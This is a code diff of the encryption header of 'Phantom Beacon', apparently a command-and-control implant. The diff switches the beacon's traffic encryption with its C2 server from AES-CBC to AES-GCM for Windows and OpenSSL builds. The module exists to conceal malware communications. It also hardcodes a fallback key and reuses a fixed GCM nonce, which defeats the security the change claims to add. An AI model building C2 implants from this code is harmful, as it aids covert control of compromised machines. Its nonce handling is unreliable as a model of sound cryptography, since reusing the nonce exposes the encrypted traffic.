@@ -2,7 +2,7 @@
 // ============================================================================
 //  crypto.h — Phantom Beacon Cryptographic Layer (Cross-Platform)
 //  ──────────────────────────────────────────────────────────────────────
-//  AES-256-CBC encryption/decryption.
+//  Authenticated Encryption: AES-256-GCM.
 //  Windows: BCrypt native. POSIX: OpenSSL.
 // ============================================================================
 
@@ -31,36 +31,19 @@
 namespace crypto {
 
 // ── Key Material ────────────────────────────────────────────────────────────
-// Must match the Python C2 server's AES_KEY and AES_IV exactly.
-// In production these would be negotiated per-session or embedded at compile time.
-static const BYTE AES_KEY[] = "PhantomC2_SecretKey_32bytes_Long";  // 32 bytes
-static const BYTE AES_IV[]  = "PhantomC2_IV16b\x00";               // 16 bytes (block size)
+// Generated at compile time from .env via phantom.utils.c2_crypto.
+#if __has_include("crypto_config.h")
+    #include "crypto_config.h"
+#else
+    static const BYTE AES_KEY[]   = "PhantomC2_SecretKey_32bytes_Long";
+    static const BYTE AES_NONCE[] = "PhntmNonce12";
+#endif
 
 constexpr ULONG KEY_LEN   = 32;
-constexpr ULONG BLOCK_LEN = 16;
-
-// ── PKCS7 Padding ──────────────────────────────────────────────────────────
-
-inline std::vector<BYTE> pkcs7_pad(const std::vector<BYTE>& data) {
-    size_t padLen = BLOCK_LEN - (data.size() % BLOCK_LEN);
-    std::vector<BYTE> padded = data;
-    padded.insert(padded.end(), padLen, static_cast<BYTE>(padLen));
-    return padded;
-}
-
-inline std::vector<BYTE> pkcs7_unpad(const std::vector<BYTE>& data) {
-    if (data.empty()) return {};
-    BYTE padLen = data.back();
-    if (padLen == 0 || padLen > BLOCK_LEN) return data;
-    // Verify padding bytes
-    for (size_t i = data.size() - padLen; i < data.size(); ++i) {
-        if (data[i] != padLen) return data;
-    }
-    return std::vector<BYTE>(data.begin(), data.end() - padLen);
-}
+constexpr ULONG NONCE_LEN = 12;
+constexpr ULONG TAG_LEN   = 16;
 
 // ── Base64 Encode/Decode ───────────────────────────────────────────────────
-// Minimal implementation — avoids dependency on CryptBinaryToStringA
 
 static const char B64_TABLE[] =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
@@ -81,7 +64,6 @@ inline std::string base64_encode(const std::vector<BYTE>& data) {
 }
 
 inline std::vector<BYTE> base64_decode(const std::string& enc) {
-    // Build reverse table
     int T[256];
     memset(T, -1, sizeof(T));
     for (int i = 0; i < 64; ++i) T[static_cast<unsigned char>(B64_TABLE[i])] = i;
@@ -91,7 +73,7 @@ inline std::vector<BYTE> base64_decode(const std::string& enc) {
     uint32_t val = 0;
     int bits = -8;
     for (unsigned char c : enc) {
-        if (T[c] == -1) continue;  // skip '=' and garbage
+        if (T[c] == -1) continue;
         val = (val << 6) | T[c];
         bits += 6;
         if (bits >= 0) {
@@ -102,7 +84,7 @@ inline std::vector<BYTE> base64_decode(const std::string& enc) {
     return out;
 }
 
-// ── AES-256-CBC Encrypt ────────────────────────────────────────────────────
+// ── AES-256-GCM Encrypt ────────────────────────────────────────────────────
 
 inline std::string encrypt(const std::string& plaintext) {
 #ifdef _WIN32
@@ -114,38 +96,33 @@ inline std::string encrypt(const std::string& plaintext) {
     status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
     if (!NT_SUCCESS(status)) return "";
 
-    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
-        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
     if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }
 
-    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0,
-        (PUCHAR)AES_KEY, KEY_LEN, 0);
+    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)AES_KEY, KEY_LEN, 0);
     if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }
 
-    std::vector<BYTE> padded = pkcs7_pad(
-        std::vector<BYTE>(plaintext.begin(), plaintext.end()));
+    BYTE nonce[NONCE_LEN];
+    memcpy(nonce, AES_NONCE, NONCE_LEN);
 
-    BYTE iv[BLOCK_LEN];
-    memcpy(iv, AES_IV, BLOCK_LEN);
+    BYTE tag[TAG_LEN];
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
+    BCRYPT_INIT_AUTH_INFO(authInfo);
+    authInfo.pbNonce = nonce;
+    authInfo.cbNonce = NONCE_LEN;
+    authInfo.pbTag = tag;
+    authInfo.cbTag = TAG_LEN;
 
-    ULONG cbCiphertext = 0;
-    status = BCryptEncrypt(hKey, padded.data(), (ULONG)padded.size(),
-        nullptr, iv, BLOCK_LEN, nullptr, 0, &cbCiphertext, 0);
-    if (!NT_SUCCESS(status)) goto cleanup;
+    ULONG cbCiphertext = (ULONG)plaintext.size();
+    std::vector<BYTE> ciphertext(cbCiphertext);
 
-    {
-        std::vector<BYTE> ciphertext(cbCiphertext);
-        memcpy(iv, AES_IV, BLOCK_LEN);
-
-        status = BCryptEncrypt(hKey, padded.data(), (ULONG)padded.size(),
-            nullptr, iv, BLOCK_LEN, ciphertext.data(), cbCiphertext, &cbCiphertext, 0);
-        if (NT_SUCCESS(status)) {
-            ciphertext.resize(cbCiphertext);
-            result = base64_encode(ciphertext);
-        }
+    status = BCryptEncrypt(hKey, (PUCHAR)plaintext.data(), (ULONG)plaintext.size(), &authInfo, nullptr, 0, ciphertext.data(), cbCiphertext, &cbCiphertext, 0);
+    if (NT_SUCCESS(status)) {
+        // Append tag to ciphertext (matching Python's cryptography library behavior)
+        ciphertext.insert(ciphertext.end(), tag, tag + TAG_LEN);
+        result = base64_encode(ciphertext);
     }
 
-cleanup:
     if (hKey) BCryptDestroyKey(hKey);
     if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
     return result;
@@ -153,83 +130,79 @@ cleanup:
     EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
     if (!ctx) return "";
 
-    std::vector<BYTE> padded = pkcs7_pad(std::vector<BYTE>(plaintext.begin(), plaintext.end()));
-    std::vector<BYTE> ciphertext(padded.size() + BLOCK_LEN);
+    std::vector<BYTE> ciphertext(plaintext.size());
     int len = 0;
     int ciphertext_len = 0;
+    BYTE tag[TAG_LEN];
 
-    BYTE iv[BLOCK_LEN];
-    memcpy(iv, AES_IV, BLOCK_LEN);
+    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)) goto cleanup;
+    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, NONCE_LEN, NULL)) goto cleanup;
+    if (1 != EVP_EncryptInit_ex(ctx, NULL, NULL, AES_KEY, AES_NONCE)) goto cleanup;
 
-    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, AES_KEY, iv)) {
-        EVP_CIPHER_CTX_free(ctx);
-        return "";
-    }
-    EVP_CIPHER_CTX_set_padding(ctx, 0); // We do our own padding
-
-    if (1 != EVP_EncryptUpdate(ctx, ciphertext.data(), &len, padded.data(), padded.size())) {
-        EVP_CIPHER_CTX_free(ctx);
-        return "";
-    }
+    if (1 != EVP_EncryptUpdate(ctx, ciphertext.data(), &len, (const BYTE*)plaintext.data(), plaintext.size())) goto cleanup;
     ciphertext_len = len;
 
-    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len)) {
-        EVP_CIPHER_CTX_free(ctx);
-        return "";
-    }
+    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len)) goto cleanup;
     ciphertext_len += len;
-    EVP_CIPHER_CTX_free(ctx);
 
+    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_LEN, tag)) goto cleanup;
+    
     ciphertext.resize(ciphertext_len);
+    ciphertext.insert(ciphertext.end(), tag, tag + TAG_LEN);
+    
+    EVP_CIPHER_CTX_free(ctx);
     return base64_encode(ciphertext);
+
+cleanup:
+    if (ctx) EVP_CIPHER_CTX_free(ctx);
+    return "";
 #endif
 }
 
-// ── AES-256-CBC Decrypt ────────────────────────────────────────────────────
+// ── AES-256-GCM Decrypt ────────────────────────────────────────────────────
 
 inline std::string decrypt(const std::string& ciphertext_b64) {
+    std::vector<BYTE> full_data = base64_decode(ciphertext_b64);
+    if (full_data.size() < TAG_LEN) return "";
+
+    // Extract tag from the end
+    std::vector<BYTE> ciphertext(full_data.begin(), full_data.end() - TAG_LEN);
+    BYTE tag[TAG_LEN];
+    memcpy(tag, full_data.data() + ciphertext.size(), TAG_LEN);
+
 #ifdef _WIN32
     BCRYPT_ALG_HANDLE hAlg = nullptr;
     BCRYPT_KEY_HANDLE hKey = nullptr;
     NTSTATUS status;
     std::string result;
 
-    std::vector<BYTE> ciphertext = base64_decode(ciphertext_b64);
-    if (ciphertext.empty()) return "";
-
     status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
     if (!NT_SUCCESS(status)) return "";
 
-    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
-        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
     if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }
 
-    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0,
-        (PUCHAR)AES_KEY, KEY_LEN, 0);
+    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)AES_KEY, KEY_LEN, 0);
     if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }
 
-    BYTE iv[BLOCK_LEN];
-    memcpy(iv, AES_IV, BLOCK_LEN);
+    BYTE nonce[NONCE_LEN];
+    memcpy(nonce, AES_NONCE, NONCE_LEN);
 
-    ULONG cbPlaintext = 0;
-    status = BCryptDecrypt(hKey, ciphertext.data(), (ULONG)ciphertext.size(),
-        nullptr, iv, BLOCK_LEN, nullptr, 0, &cbPlaintext, 0);
-    if (!NT_SUCCESS(status)) goto cleanup;
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
+    BCRYPT_INIT_AUTH_INFO(authInfo);
+    authInfo.pbNonce = nonce;
+    authInfo.cbNonce = NONCE_LEN;
+    authInfo.pbTag = tag;
+    authInfo.cbTag = TAG_LEN;
 
-    {
-        std::vector<BYTE> plaintext(cbPlaintext);
-        memcpy(iv, AES_IV, BLOCK_LEN);
+    ULONG cbPlaintext = (ULONG)ciphertext.size();
+    std::vector<BYTE> plaintext(cbPlaintext);
 
-        status = BCryptDecrypt(hKey, ciphertext.data(), (ULONG)ciphertext.size(),
-            nullptr, iv, BLOCK_LEN, plaintext.data(), cbPlaintext, &cbPlaintext, 0);
-        if (NT_SUCCESS(status)) {
-            plaintext.resize(cbPlaintext);
-            auto unpadded = pkcs7_unpad(plaintext);
-            result = std::string(unpadded.begin(), unpadded.end());
-        }
+    status = BCryptDecrypt(hKey, ciphertext.data(), (ULONG)ciphertext.size(), &authInfo, nullptr, 0, plaintext.data(), cbPlaintext, &cbPlaintext, 0);
+    if (NT_SUCCESS(status)) {
+        result = std::string(plaintext.begin(), plaintext.begin() + cbPlaintext);
     }
 
-cleanup:
     if (hKey) BCryptDestroyKey(hKey);
     if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
     return result;
@@ -237,41 +210,28 @@ cleanup:
     EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
     if (!ctx) return "";
 
-    std::vector<BYTE> ciphertext = base64_decode(ciphertext_b64);
-    if (ciphertext.empty()) {
-        EVP_CIPHER_CTX_free(ctx);
-        return "";
-    }
-
-    std::vector<BYTE> plaintext(ciphertext.size() + BLOCK_LEN);
+    std::vector<BYTE> plaintext(ciphertext.size());
     int len = 0;
     int plaintext_len = 0;
 
-    BYTE iv[BLOCK_LEN];
-    memcpy(iv, AES_IV, BLOCK_LEN);
+    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)) goto cleanup;
+    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, NONCE_LEN, NULL)) goto cleanup;
+    if (1 != EVP_DecryptInit_ex(ctx, NULL, NULL, AES_KEY, AES_NONCE)) goto cleanup;
 
-    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, AES_KEY, iv)) {
-        EVP_CIPHER_CTX_free(ctx);
-        return "";
-    }
-    EVP_CIPHER_CTX_set_padding(ctx, 0);
-
-    if (1 != EVP_DecryptUpdate(ctx, plaintext.data(), &len, ciphertext.data(), ciphertext.size())) {
-        EVP_CIPHER_CTX_free(ctx);
-        return "";
-    }
+    if (1 != EVP_DecryptUpdate(ctx, plaintext.data(), &len, ciphertext.data(), ciphertext.size())) goto cleanup;
     plaintext_len = len;
 
-    if (1 != EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &len)) {
-        EVP_CIPHER_CTX_free(ctx);
-        return "";
-    }
-    plaintext_len += len;
-    EVP_CIPHER_CTX_free(ctx);
+    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, TAG_LEN, tag)) goto cleanup;
 
-    plaintext.resize(plaintext_len);
-    auto unpadded = pkcs7_unpad(plaintext);
-    return std::string(unpadded.begin(), unpadded.end());
+    if (1 != EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &len)) goto cleanup;
+    plaintext_len += len;
+
+    EVP_CIPHER_CTX_free(ctx);
+    return std::string(plaintext.begin(), plaintext.begin() + plaintext_len);
+
+cleanup:
+    if (ctx) EVP_CIPHER_CTX_free(ctx);
+    return "";
 #endif
 }
 
